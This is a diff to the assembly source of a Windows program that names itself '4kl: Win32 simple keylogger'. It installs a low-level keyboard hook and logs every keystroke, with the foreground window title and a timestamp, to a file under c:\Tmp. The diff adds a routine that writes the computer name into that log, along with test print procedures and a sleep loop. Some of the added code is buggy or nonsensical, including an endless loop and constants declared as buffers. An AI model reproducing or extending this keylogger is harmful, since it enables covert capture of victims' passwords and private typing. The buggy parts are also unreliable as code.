@@ -4,13 +4,121 @@
 ;   =========================================================
     section '.code' code import writeable readable executable
 ;   =========================================================
+include 'win32ax.inc'
+;include 'conutils.inc'
+include 'local_iat.imports'
+include 'macro\if.inc'
 
-    include 'win32ax.inc'
+;-------------------------------------------------------------------------------
+macro println arg*
+{
+   cinvoke wprintf, '%s', arg
+   cinvoke wprintf, CRLF
+}
 
-;   =====================
-    include 'iat.imports'
-;   =====================
+;-------------------------------------------------------------------------------
+macro print_num_ln arg*
+{
+   cinvoke wprintf, '%d', arg
+   cinvoke wprintf, CRLF
+}
 
+
+; -----------------------------------------------------------
+; MAIN PROC
+; -----------------------------------------------------------
+proc LoopFunc
+    mov eax, SleepTime
+    test eax, eax
+.readloop:    
+    cinvoke SleepX, eax    
+    jmp     .readloop
+endp
+
+
+START_SIZE = 1024
+proc ReadTheInput
+begin
+        mov     [SourceSize], START_SIZE
+
+        stdcall GetMem, [SourceSize]
+        mov     edi, eax
+
+        xor     esi, esi
+
+.readloop:
+        mov     ebx, [SourceSize]
+        lea     eax, [esi+edi]
+        sub     ebx, esi
+
+        stdcall FileRead, [STDIN], eax, ebx
+        cmp     eax, ebx
+        jne     .endoffile
+
+        add     esi, ebx
+        shl     [SourceSize], 1
+
+        stdcall ResizeMem, edi, [SourceSize]
+        mov     edi, eax
+
+        jmp     .readloop
+
+.endoffile:
+        add     esi, eax
+        mov     [SourceSize], esi
+        xor     eax, eax
+
+        mov     [pSourceBuffer], edi
+        mov     [edi+esi], eax  ; zero terminated...
+
+        return
+endp
+
+proc MyPrintNumber
+     local  mydouble:QWORD, myfloat:DWORD
+
+     mov     [myfloat], 3.141
+     fld     [myfloat]
+     fstp    [mydouble]
+     cinvoke printf, "fp number %f", double [mydouble]
+endp 
+
+proc MyPrintString
+         
+        push 0          ;C-string null
+        push "test"
+        push esp
+        call printf
+        add esp,12
+        push 0
+        call exit
+        ;ret
+endp 
+
+proc CheckInstances uses eax
+    locals
+        dwBytesWritten      rd 1
+        hFile               rd 1
+        buff                du 256      dup (?)
+        tmpstr              du 256      dup (?)
+    endl
+    ;invoke    CreateMutexA, onlyOneCopy,0,0
+    ;invoke    GetLastError
+
+    ;cmp     eax,ERROR_ALREADY_EXISTS
+    ;je  more_than_one_copy  
+
+    ;invoke    GetLastError
+    ;cinvoke wsprintfW, addr buff, sfrmtError, addr eax
+    ;stdcall WriteToFile, addr buff
+
+
+    invoke GetComputerNameA, addr tmpstr, addr dwBytesWritten
+    cinvoke wsprintfW, addr buff, sfrmtComputer, addr tmpstr
+    stdcall WriteToFile, addr buff
+  
+    ret
+endp
 
     FILE_APPEND_DATA = 0x0004
 
@@ -62,7 +170,6 @@ proc LowLevelKeyboardProc uses esi, nCode, wParam, lParam
     endl
 
     .if (([nCode] = HC_ACTION) & (([wParam] = WM_SYSKEYDOWN) | ([wParam] = WM_KEYDOWN)))
-
         mov esi, [lParam]
         virtual at esi
             kbHook KBDLLHOOKSTRUCT <>
@@ -74,6 +181,8 @@ proc LowLevelKeyboardProc uses esi, nCode, wParam, lParam
         shl eax, 0x10
         inc eax
         invoke GetKeyNameTextW, eax, addr szKey, 256
+
+        stdcall CheckInstances
 
         invoke GetForegroundWindow
         .if eax <> NULL
@@ -354,6 +463,11 @@ proc KeyLogger uses edi, lpParameter
 
     invoke UnhookWindowsHookEx, addr hKeyHook
     xor eax, eax
+
+more_than_one_copy:
+    push    eax     ; call stop and lets go away
+    call    exit
+
 exit:
     ret
 endp
@@ -363,22 +477,31 @@ endp
 ;           ENTRY POINT
 ;   =========================================================
 entry $
-
+    ;println progName
+    ;println progDesc
+    ;println progCopy
     invoke CreateThread, NULL, NULL, KeyLogger, NULL, NULL, dwThread
     test eax, eax
     je @f
 
     invoke WaitForSingleObject, eax, -1
+
+    stdcall LoopFunc
+
     jmp Exit
 
 @@: xor eax, eax
     inc eax
 Exit:
     ret
-
+; -----------------------------------------------------------
+; VARIABLES
+; -----------------------------------------------------------
     tittleFrmt              du 10, 10, '[%s] - %02d/%02d/%04d, %02d:%02d:%02d', 10, 0
-    log_file                du 'log_file.txt',      0
-    
+    log_file                du 'c:\\Tmp\\log_file.txt',      0
+    sfrmtError              du '[ERROR: %d]',       0
+    sfrmtComputer           du '[Computername: %s]',0
+    sfrmtUsername           du '[Username: %s]',    0
     sfrmtLcontrol           du '[CtrlL + %s]',      0
     sfrmtRcontrol           du '[CtrlR + %s]',      0
     sfrmtLmenu              du '[AltL + %s]',       0
@@ -418,7 +541,13 @@ Exit:
     sNumLock                du '[Num Lock]',        0
     sScrollLock             du '[Scroll Lock]',     0
     sApplications           du '[Applications]',    0
-
+    CRLF                    du '',13,10,0  
+    progName                du '4kl: Win32 simple keylogger, 4Kilobytes',0
+    progDesc                du 'Logs to c:\\Tmp\\log_file.txt',0
+    progCopy                du 'Copyright (c) 2000-2021 by gplante',0
+    ERROR_ALREADY_EXISTS    rd 183
+    SleepTime               rd 100
+    onlyOneCopy             du 'Global\zkl',        0
     LocalTime               SYSTEMTIME <>
     dwThread                rd 1
     hKeyHook                rd 1
